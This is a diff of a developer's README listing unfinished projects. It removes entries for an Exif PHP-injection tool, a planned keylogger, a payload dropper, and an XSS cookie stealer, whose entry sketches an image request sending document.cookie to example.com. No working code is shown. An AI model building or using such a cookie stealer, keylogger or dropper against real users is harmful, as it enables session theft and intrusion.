@@ -12,12 +12,6 @@ A list of my unfinished projects that I should work on. Please note: some of the
 
 **csfactsbot**: A Twitter bot that tweets out computer science facts. What I still need to do: come up with a list of computer science facts, then put them as JSON or lines in a text file or something, then make a Python script that randomly chooses one fact, then tweets it out using Tweepy.  [Link](https://github.com/0x416c616e/csfactsbot)
 
-**BadExif**: Exif security tool. It lets you put PHP code in images. It currently just has a couple example images that have PHP in them already. What I still need to do: make it so you can choose which image to use, and what PHP code you want to be put into the file. [Link](https://github.com/0x416c616e/badexif)
-
-**Keylogger.js**: a JS-based keylogger. What I still need to do: make the keylogger. [Link](https://github.com/0x416c616e/keyloggerjs)
-
-**Cookie Stealer**: A JS-based cookie stealer for use against sites with XSS vulnerabilities. What I still need to do: make the cookie stealer JS. It's very simple. It should make an <img> tag request to example.com/image.jpg?cookie=document.cookie or something like that. [Link](https://github.com/0x416c616e/cookiestealer)
-
 **Rootkit Finder**: A basic tool for finding rootkits and other suspicious things in Linux. What I still need to do: finish stuff for the remaining forms of task scheduling, add the ability to log output, and possibly actually check the output rather than merely listing it. Also needs ability to check history of non-root users. [Link](https://github.com/0x416c616e/rootkit_finder)
 
 **CVE Alerter**: A PHP project which lets you input software to keep track of. When there's a new CVE for it, it will alert you via email. What I still need to do: everything. I will need to make a LAMP VM on one of my hypervisors, then start working on this. It will need to use a CVE API. It will also need to use PHP to email the user. I haven't really started this project yet. [Link](https://github.com/0x416c616e/CVE_Alerter)
@@ -35,8 +29,6 @@ A list of my unfinished projects that I should work on. Please note: some of the
 **SQL learning**: a repo of notes on learning SQL. What I still need to do: convert my CS315 database stuff to this repo. [Link](https://github.com/0x416c616e/sql_learning)
 
 **Data Aggregator**: Aggregates financial data from a number of sources. What I still need to do: use Yahoo Finance or the Bloomberg Open API or whatever in order to aggregate financial data from numerous sources. Should be able to track stocks or bonds over time. [Link](https://github.com/0x416c616e/sfrdataaggregator)
-
-**Abyss Dropper**: A multi-stage payload dropper. What I still need to do: everything aside from the logo. [Link](https://github.com/0x416c616e/abyssdropper)
 
 **Chicagoland Software**: My new website. What I still need to do: server, SSL, layout, logo, content, etc. It wil be like a more updated version of my old Saint Louis Software website. The blog should use SSG, and the projects section should have a more up-to-date list of my GitHub projects. [Link](https://github.com/0x416c616e/chicagolandsoftware)
 
